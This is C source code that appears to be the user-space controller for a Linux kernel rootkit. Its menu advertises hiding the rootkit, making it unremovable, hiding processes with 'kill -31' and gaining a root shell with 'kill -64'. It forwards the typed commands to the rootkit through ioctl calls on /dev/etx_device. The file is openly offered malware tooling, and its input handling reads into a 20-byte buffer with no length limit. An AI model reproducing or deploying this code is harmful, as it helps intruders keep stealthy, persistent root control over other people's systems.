#include <stdio.h>	
#include <stdlib.h>	
#include <string.h>	
#include <sys/types.h>
#include <fcntl.h>	
#include <unistd.h>	
#include<sys/ioctl.h>

#define WR_VALUE _IOW('a','a',int32_t*)
#define RD_VALUE _IOR('a','b',int32_t*)

#define MAX_LIMIT 20

void red()
{
	printf("\033[1;31m");
}
void green()
{
	printf("\033[1;32m");
}

void yellow()
{	
	printf("\033[1;33m");
}

void reset()
{
	printf("\033[0m");
}

void cmd(void)
{
	yellow();
	printf("\n\nᛗᚨᛚᛖᚠᛁᚴ\n\n");
	reset();

	green();
	printf("\n|+++++++++++++++++++ Available commands ++++++++++++++++++|\n\n");
	
	yellow();
	printf("hide\t\t");
	reset();

	printf(": Command to hide rootkit \n\t\t=> In this mode, in no way this rootkit be removable\n\n");

	yellow();
	printf("show\t\t");
	reset();

	printf(": Command to unhide rootkit \n\t\t=> In this mode, rootkit_protect and rootkit_remove will work effectively\n\n");

	yellow();
	printf("protect\t\t");
	reset();

	printf(": Command to make rootkit unremovable (even if it can be seen in usermode)\n\n");

	yellow();
	printf("remove\t\t");
	reset();

	printf(": Command to make rootkit removable\n\n");

	yellow();
	printf("kill -31 <pid>\t");
	reset();

	printf(": Command to hide/unhide running process. Applicable in normal shell prompt.\n\t\t=> write: `process` in the below prompt to close without any error\n\n");

	yellow();
        printf("kill -64 <any pid>\t");
        reset();

	printf(": Command to get rootshell. Applicable in normal shell prompt.\n\t\t=> write: `root` in the below prompt to close without any error\n\n");
}


int main()
{
        int fd;

	cmd();
 
        fd = open("/dev/etx_device", O_RDWR);
        if(fd < 0) {
                printf("Cannot open Character device file...\n");
                return 0;
        }
 
	printf("\n[+] Character Device file opened\n");

	char str[MAX_LIMIT];
        char str1[MAX_LIMIT];

	printf("[?] Enter the Value to send: ");
	scanf("%[^\n]%*c", str);

	if((strncmp(str,"process", sizeof("process")) == 0) || (strncmp(str,"root", sizeof("root")) == 0))
	{
		puts("[*] Exiting...");
	}

        printf("[+] Written Value to Character Device file\n");
	ioctl(fd, WR_VALUE, (char*) str);
        ioctl(fd, RD_VALUE, (char*) str1);
	printf("[*] Reading Value from Character Device file: %s", str1);
	yellow();
	printf("%s\n", str);
	reset();

	getchar();
	printf("[+] Character Device file closed\n");
	close(fd);

}

